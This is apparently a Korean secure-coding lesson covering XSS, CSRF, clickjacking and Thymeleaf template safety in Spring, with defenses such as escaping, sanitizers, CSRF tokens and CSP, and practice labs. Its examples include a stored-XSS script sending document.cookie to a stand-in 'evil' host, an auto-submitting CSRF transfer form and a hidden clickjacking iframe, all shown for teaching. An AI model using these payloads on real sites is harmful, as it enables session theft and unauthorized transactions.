# Day 3 — XSS · CSRF · Thymeleaf 보안

> **Thymeleaf SSR 환경에서 가장 중요한 두 클라이언트 공격.** 그리고 Thymeleaf 특유의 안전·위험 패턴.

## 1. XSS (Cross-Site Scripting) — 분류

| 종류 | 흐름 |
|------|------|
| **Reflected XSS** | URL/요청에 포함된 스크립트가 즉시 응답에 반영 |
| **Stored (Persistent) XSS** | DB에 저장된 악성 스크립트가 다른 사용자가 페이지 볼 때 실행 |
| **DOM-based XSS** | 서버는 무관, 브라우저 JS가 `location.hash` 등을 위험하게 사용 |
| **Mutation XSS (mXSS)** | 브라우저 파싱 차이로 sanitization 우회 |

### 영향
- 세션 쿠키 탈취 (HttpOnly로 차단되지만 다른 정보는 가능)
- CSRF 토큰 추출 → CSRF 우회
- Keylogger 삽입
- 화면 변조·피싱
- 권한 행위 대리 실행

---

## 2. Reflected XSS 시연

취약 코드 (JSP·옛 Spring·Thymeleaf `th:utext`):
```html
<!-- ❌ -->
<div th:utext="${query}">검색어</div>
```
요청: `?query=<script>alert(1)</script>`

→ HTML 그대로 출력되어 스크립트 실행.

### Thymeleaf 핵심 사실
- **`th:text`** — HTML 자동 이스케이프 (`<` → `&lt;`). **안전.**
- **`th:utext`** — Unescaped TEXT. 의도적으로 HTML을 출력. **위험.**
- `[[${...}]]` — `th:text`와 동일 (이스케이프)
- `[(${...})]` — `th:utext`와 동일 (위험)

**규칙: `th:utext`는 99% 안 쓴다.** 정말 HTML을 표시해야 한다면 OWASP Java HTML Sanitizer로 정제 후.

---

## 3. Stored XSS — 가장 위험

### 시나리오
1. 공격자가 게시글에 `<script>fetch('https://evil/?c='+document.cookie)</script>` 작성
2. DB 저장됨 (서버 입장에서 일반 텍스트)
3. 다른 사용자가 게시글 보면 → 자기 브라우저에서 스크립트 실행 → 정보 탈취

### Thymeleaf 게시글 출력
```html
<!-- ❌ 위험 -->
<div th:utext="${post.content}">...</div>

<!-- ✅ 안전 (이스케이프됨) -->
<div th:text="${post.content}">...</div>

<!-- 줄바꿈을 <br>로 보여주고 싶으면 -->
<div th:utext="${#strings.replace(#strings.escapeXml(post.content), '\n', '&lt;br/&gt;')}"></div>
<!-- 또는 CSS white-space: pre-wrap 사용이 안전 -->
<div style="white-space: pre-wrap;" th:text="${post.content}">...</div>
```

### Rich Text 에디터(WYSIWYG)의 경우
사용자가 의도적으로 HTML 입력하는 곳(블로그 본문 등). 출력 시 sanitize 필요.

**OWASP Java HTML Sanitizer**:
```java
PolicyFactory policy = Sanitizers.FORMATTING
    .and(Sanitizers.LINKS)
    .and(Sanitizers.BLOCKS)
    .and(Sanitizers.IMAGES);

String safe = policy.sanitize(userHtml);
// → <p>좋은 글</p><script>... </script>  →  <p>좋은 글</p>
model.addAttribute("safeContent", safe);
```
```html
<div th:utext="${safeContent}"></div>  <!-- sanitize 됐으니 utext OK -->
```

### Markdown 사용 시
- `flexmark-java` 등으로 변환
- 변환 후에도 HTML sanitizer 한 번 더

---

## 4. DOM-based XSS

서버 응답은 무해하지만 클라이언트 JS가 위험하게 처리.
```html
<script>
  // ❌ 위험
  document.getElementById('greeting').innerHTML =
      'Hello, ' + new URLSearchParams(location.search).get('name');
</script>
```
URL: `?name=<img src=x onerror=alert(1)>`

### 방어
- `innerHTML` 대신 `textContent`
- `location.hash`, `location.search`, `document.referrer`, `postMessage` 데이터를 신뢰 X
- DOMPurify로 sanitize

---

## 5. 컨텍스트별 인코딩

XSS 방어의 핵심은 **출력되는 컨텍스트에 맞는 인코딩**.

| 컨텍스트 | 인코딩 | 예 |
|---------|------|---|
| HTML 본문 | HTML escape | `< → &lt;` |
| HTML 속성값 | HTML attribute escape + 항상 따옴표 | `" → &quot;` |
| JavaScript 문자열 | JS escape | `<` 등 |
| URL 파라미터 | URL encode | `<` → `%3C` |
| CSS 값 | CSS escape | `\3C` |
| JSON 본문 | JSON escape (`<`) |

### Thymeleaf의 컨텍스트 인식
Thymeleaf는 기본적으로 HTML 컨텍스트에 맞게 이스케이프하지만 다른 컨텍스트는 주의:

```html
<!-- HTML 속성 — 안전 -->
<input type="text" th:value="${name}"/>

<!-- JavaScript 안의 변수 — 주의! -->
<script>
  var name = [[${name}]];           <!-- 이건 JSON으로 인코딩됨 (Thymeleaf inline JS) -->
  var bad  = '[(${name})]';         <!-- ❌ 절대 안 됨 (unescaped) -->
</script>

<!-- URL 컨텍스트 — th:href 사용하면 자동 -->
<a th:href="@{/user(name=${name})}">link</a>
```

### Thymeleaf JavaScript inline
```html
<script th:inline="javascript">
  /* Thymeleaf가 컨텍스트 인식해서 안전하게 직렬화 */
  var user = /*[[${user}]]*/ null;
</script>
```

---

## 6. XSS 종합 방어 — 다층

1. **입력 검증**: 길이·형식 검증. HTML 의도된 곳 외에는 태그 제거
2. **출력 인코딩**: 컨텍스트별 escape (`th:text`)
3. **HTML Sanitizer** (위지윅에 한해)
4. **CSP**: 마지막 방어선
5. **HttpOnly 쿠키**: 세션 탈취 방어
6. **Trusted Types** (모던 브라우저): `innerHTML` 등에 raw string 금지

---

## 7. CSRF (Cross-Site Request Forgery)

### 원리
1. 사용자가 `bank.com`에 로그인 (세션 쿠키 발급)
2. 공격자 사이트 방문
3. 공격자 페이지에 숨겨진 폼/이미지:
   ```html
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="1000000">
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. 브라우저는 자동으로 `bank.com` 쿠키 첨부 → 서버는 사용자가 자발적 송금한 줄 알고 실행

### 핵심 깨달음
**브라우저는 어떤 페이지에서 발생한 요청이든 해당 도메인의 쿠키를 자동 첨부한다.** 이를 이용한 공격.

### 방어 — CSRF Token (Synchronizer Token Pattern)
1. 서버가 세션마다 무작위 토큰 생성, 폼 hidden input에 포함
2. POST/PUT/DELETE 요청 시 토큰 함께 전송
3. 서버는 요청 본문의 토큰과 세션의 토큰 비교
4. 공격자는 토큰을 모름 (SOP로 응답을 읽을 수 없음)

### Spring Security CSRF (기본 ON)
```java
http.csrf(c -> c.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
```

### Thymeleaf 자동 토큰
Thymeleaf + Spring Security가 결합되면 모든 form에 자동으로 토큰 hidden field 삽입:
```html
<form th:action="@{/transfer}" method="post">
  <!-- 자동으로: <input type="hidden" name="_csrf" value="..."/> -->
  <input name="amount"/>
  <button>이체</button>
</form>
```

**주의**: HTML form이 아니라 직접 fetch/AJAX로 보낼 때는 메타 태그로 노출:
```html
<meta name="_csrf" th:content="${_csrf.token}"/>
<meta name="_csrf_header" th:content="${_csrf.headerName}"/>
```
```javascript
fetch('/api', {
  method: 'POST',
  headers: { [csrfHeader]: csrfToken },
  body: ...
});
```

### SameSite Cookie — 추가 방어
모던 브라우저는 기본 Lax. cross-site에서 POST는 쿠키 안 보냄.
- `Strict`: 어떤 cross-site 요청에도 안 보냄 (최강이지만 외부 링크로 들어와도 비로그인 상태)
- `Lax`: top-level GET만 보냄 (기본값)
- `None`: 모든 곳에 보냄 (Secure 필수)

> SameSite=Lax는 CSRF에 좋은 기본 방어지만 **단독으로 의존하면 안 된다**. 일부 브라우저·옛 버전·서브도메인 케이스 때문.

### 어떤 요청에 CSRF 토큰?
- **상태 변경 요청 (POST/PUT/DELETE/PATCH)**: 토큰 필수
- **GET**: 토큰 불필요 (단, GET이 상태 변경하면 안 됨)
- **API + Bearer Token 인증**: CSRF 토큰 불필요 (자동 쿠키 첨부가 없음)

```java
// REST API는 CSRF 비활성화 가능 (단, 쿠키 기반 인증 안 쓸 때만)
http.csrf(c -> c.ignoringRequestMatchers("/api/**"));
```

---

## 8. Clickjacking

```html
<iframe src="https://bank.com/transfer" style="opacity:0; position:absolute"></iframe>
<button>경품 받기</button>  <!-- 실제로는 iframe의 이체 버튼 -->
```

### 방어
- `X-Frame-Options: DENY` 또는 `SAMEORIGIN`
- CSP `frame-ancestors 'none'` (모던 권장)

Spring 기본 ON. 확인:
```java
http.headers(h -> h.frameOptions(f -> f.deny()));
```

---

## 9. Thymeleaf 특화 보안 체크리스트

### ✅ 안전 패턴
- `th:text="${userInput}"` (이스케이프)
- `th:value="${userInput}"` (속성 자동 escape)
- `th:href="@{/users/{id}(id=${userId})}"` (URL 처리)
- `th:src="@{/img/...}"` (URL)
- inline `var x = /*[[${val}]]*/ ''` (JS 컨텍스트 자동)

### ❌ 위험 패턴
- `th:utext="${userInput}"` — sanitize 안 한 입력
- `th:href="${url}"` — `javascript:alert(1)` 같은 URL 가능
- `<a th:href="@{${dynamicPath}}">` — 동적 path
- 뷰 이름에 입력: `return "fragments/" + userInput;`
- 동적 fragment: `th:replace="~{${fragmentName} :: section}"`
- `th:attr="onclick=${...}"` — 이벤트 핸들러에 사용자 입력

### URL의 javascript: scheme
```html
<!-- ❌ 사용자가 URL을 입력하는 곳 -->
<a th:href="${user.homepage}">홈페이지</a>
<!-- 공격: user.homepage = "javascript:alert(document.cookie)" -->
```

방어: URL이 http/https로 시작하는지 검증:
```java
public static boolean isSafeUrl(String url) {
    if (url == null) return false;
    String lower = url.toLowerCase(Locale.ROOT).trim();
    return lower.startsWith("http://") || lower.startsWith("https://") || lower.startsWith("/");
}
```

---

## 10. CSP — Thymeleaf 환경 권장 정책

```java
http.headers(h -> h.contentSecurityPolicy(c -> c.policyDirectives(
    "default-src 'self'; " +
    "script-src 'self' 'nonce-" + nonce + "'; " +    // nonce 권장
    "style-src 'self'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self'; " +
    "connect-src 'self'; " +
    "frame-ancestors 'none'; " +
    "form-action 'self'; " +
    "base-uri 'self'; " +
    "object-src 'none'; " +
    "report-uri /csp-report"
)));
```

### nonce-based CSP — Thymeleaf 적용
```java
// 필터에서 매 요청 nonce 생성
public class CspNonceFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(...) throws ... {
        byte[] bytes = new byte[16];
        new SecureRandom().nextBytes(bytes);
        String nonce = Base64.getEncoder().encodeToString(bytes);
        request.setAttribute("cspNonce", nonce);
        response.setHeader("Content-Security-Policy",
            "default-src 'self'; script-src 'self' 'nonce-" + nonce + "'");
        filterChain.doFilter(request, response);
    }
}
```

```html
<!-- 모든 inline 스크립트는 nonce 부여 -->
<script th:attr="nonce=${#httpServletRequest.getAttribute('cspNonce')}">
  // 정상 스크립트
</script>
```

---

## 11. 실습

### 실습 4.1 — Stored XSS
- `vulnerable_app`의 `/vuln/board`에 `<script>alert(document.cookie)</script>` 작성
- 다른 사용자로 게시판 조회 → alert 발생 확인
- `/safe/board`로 패치 후 동일 공격이 텍스트로만 보이는지 확인

### 실습 4.2 — CSRF
- `vulnerable_app/csrf_poc.html` (CSRF PoC 페이지)을 다른 origin에서 열기
- 로그인된 상태에서 PoC 페이지 → 자동 송금 시도
- CSRF 토큰 활성화 후 동일 시도 → 403 확인

### 실습 4.3 — `th:utext` 검색·제거
본인 회사 코드에서:
```
grep -rn "th:utext\|\\[(.*)\\]" src/main/resources/templates/
```
모든 결과를 검토하고, 정말 필요한지·sanitize 됐는지 확인.

### 실습 4.4 — CSP 적용
본인 사이드 프로젝트에 CSP 헤더 추가. https://csp-evaluator.withgoogle.com 에서 정책 평가.

---

## 12. 실제 사례

### Twitter Mikeyy Worm (2009)
Stored XSS로 트윗 안에 자기 자신을 RT시키는 스크립트. 시간당 수십만 명 감염. JavaScript on/off 같은 단순 차단이 부족함을 보임.

### British Airways (2018, Magecart)
공급망 공격 + JS 인젝션. 결제 페이지에 카드 정보 탈취 스크립트. CSP 잘 됐으면 차단 가능했음. → GDPR로 £20M 벌금.

### Samy MySpace Worm (2005)
역사상 최대 XSS 웜. 24시간 동안 1백만+ 친구 추가. 만든 이 Samy Kamkar는 3년 보호관찰.

---

## 정리
- Thymeleaf SSR에서는 **`th:text` 기본, `th:utext`는 거의 안 씀** — 이 하나로 XSS의 80% 차단
- **CSRF는 Spring Security 기본 ON 유지** — 검증된 토큰 + SameSite Lax
- **CSP는 마지막 보험**: XSS가 뚫려도 임팩트 축소
